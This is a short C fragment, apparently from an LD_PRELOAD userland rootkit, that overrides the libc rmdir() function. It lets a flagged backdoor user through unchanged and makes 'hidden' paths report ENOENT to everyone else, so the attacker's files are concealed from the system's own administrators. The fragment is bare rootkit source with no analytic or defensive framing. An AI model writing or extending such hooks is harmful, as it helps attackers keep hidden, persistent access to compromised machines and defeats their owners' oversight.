int rmdir(const char *pathname)
{
    hook(CRMDIR);
    if(is_bdusr()) return (long)call(CRMDIR, pathname);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CRMDIR, pathname);
}
